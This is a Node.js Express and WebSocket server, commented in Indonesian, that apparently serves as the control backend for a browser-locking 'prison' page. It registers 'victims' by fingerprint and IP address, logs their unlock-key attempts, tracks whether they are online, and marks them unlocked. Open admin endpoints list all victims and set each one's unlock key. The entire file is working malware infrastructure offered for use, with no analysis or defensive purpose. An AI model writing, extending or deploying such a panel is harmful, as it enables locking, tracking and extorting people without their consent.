const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, './'))); // Serve file static

// Database sederhana pake file
const VICTIMS_FILE = './victims.json';
if (!fs.existsSync(VICTIMS_FILE)) {
    fs.writeFileSync(VICTIMS_FILE, JSON.stringify({ victims: [] }));
}

// Helper functions
function getVictims() {
    return JSON.parse(fs.readFileSync(VICTIMS_FILE));
}

function saveVictims(data) {
    fs.writeFileSync(VICTIMS_FILE, JSON.stringify(data, null, 2));
}

// Generate ID unik
function generateId() {
    return crypto.randomBytes(16).toString('hex');
}

// ========== API ENDPOINTS ==========

// Register victim baru
app.post('/api/register', (req, res) => {
    const { fingerprint, userAgent, ip } = req.body;
    const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    
    const victims = getVictims();
    
    // Cek apakah udah pernah daftar
    let victim = victims.victims.find(v => v.fingerprint === fingerprint);
    
    if (!victim) {
        // Victim baru
        victim = {
            id: generateId(),
            fingerprint: fingerprint,
            ip: clientIp,
            userAgent: userAgent,
            firstSeen: new Date().toISOString(),
            lastSeen: new Date().toISOString(),
            attempts: 0,
            key: 'Bebas123', // Default key
            unlocked: false,
            online: true,
            logs: []
        };
        
        victims.victims.push(victim);
        saveVictims(victims);
        
        console.log(`[NEW VICTIM] ${victim.id} - ${clientIp}`);
    } else {
        // Update existing
        victim.lastSeen = new Date().toISOString();
        victim.online = true;
        victim.ip = clientIp;
        saveVictims(victims);
    }
    
    res.json({ 
        success: true, 
        victimId: victim.id,
        key: victim.key,
        attempts: victim.attempts
    });
});

// Record attempt
app.post('/api/attempt', (req, res) => {
    const { victimId, key } = req.body;
    
    const victims = getVictims();
    const victim = victims.victims.find(v => v.id === victimId);
    
    if (!victim) {
        return res.status(404).json({ error: 'Victim not found' });
    }
    
    victim.attempts++;
    victim.lastSeen = new Date().toISOString();
    
    // Catet log
    if (!victim.logs) victim.logs = [];
    victim.logs.push({
        time: new Date().toISOString(),
        key: key,
        correct: (key === victim.key)
    });
    
    saveVictims(victims);
    
    res.json({ 
        success: true, 
        attempts: victim.attempts,
        correct: (key === victim.key)
    });
});

// Unlock
app.post('/api/unlock', (req, res) => {
    const { victimId } = req.body;
    
    const victims = getVictims();
    const victim = victims.victims.find(v => v.id === victimId);
    
    if (!victim) {
        return res.status(404).json({ error: 'Victim not found' });
    }
    
    victim.unlocked = true;
    victim.unlockTime = new Date().toISOString();
    victim.online = false;
    saveVictims(victims);
    
    console.log(`[UNLOCKED] ${victimId}`);
    
    res.json({ success: true });
});

// Heartbeat
app.post('/api/heartbeat', (req, res) => {
    const { victimId } = req.body;
    
    const victims = getVictims();
    const victim = victims.victims.find(v => v.id === victimId);
    
    if (victim) {
        victim.lastSeen = new Date().toISOString();
        victim.online = true;
        saveVictims(victims);
    }
    
    res.json({ success: true });
});

// Admin: get all victims
app.get('/api/admin/victims', (req, res) => {
    const victims = getVictims();
    res.json(victims);
});

// Admin: update key
app.post('/api/admin/key', (req, res) => {
    const { victimId, newKey } = req.body;
    
    const victims = getVictims();
    const victim = victims.victims.find(v => v.id === victimId);
    
    if (victim) {
        victim.key = newKey;
        saveVictims(victims);
        res.json({ success: true });
    } else {
        res.status(404).json({ error: 'Not found' });
    }
});

// ========== WEBSOCKET ==========
wss.on('connection', (ws, req) => {
    const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    console.log(`[WS CONNECT] ${clientIp}`);
    
    ws.on('message', (message) => {
        try {
            const data = JSON.parse(message);
            
            if (data.type === 'register') {
                ws.victimId = data.victimId;
                console.log(`[WS REGISTER] ${data.victimId}`);
            }
            
            if (data.type === 'heartbeat') {
                // Update last seen
                const victims = getVictims();
                const victim = victims.victims.find(v => v.id === data.victimId);
                if (victim) {
                    victim.lastSeen = new Date().toISOString();
                    victim.online = true;
                    saveVictims(victims);
                }
            }
            
        } catch (e) {}
    });
    
    ws.on('close', () => {
        if (ws.victimId) {
            console.log(`[WS DISCONNECT] ${ws.victimId}`);
            // Set offline setelah 30 detik (biar di-handle sama interval)
        }
    });
});

// Cleanup offline victims
setInterval(() => {
    const victims = getVictims();
    let changed = false;
    const now = Date.now();
    
    victims.victims.forEach(v => {
        const lastSeen = new Date(v.lastSeen).getTime();
        if (v.online && (now - lastSeen > 30000)) { // 30 detik offline
            v.online = false;
            changed = true;
            console.log(`[OFFLINE] ${v.id}`);
        }
    });
    
    if (changed) {
        saveVictims(victims);
    }
}, 10000);

// ========== START SERVER ==========
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`🚀 Server running on http://localhost:${PORT}`);
    console.log(`📁 Prison website: http://localhost:${PORT}/`);
    console.log(`📊 Admin panel: http://localhost:${PORT}/admin.html (kalo bikin)`);
});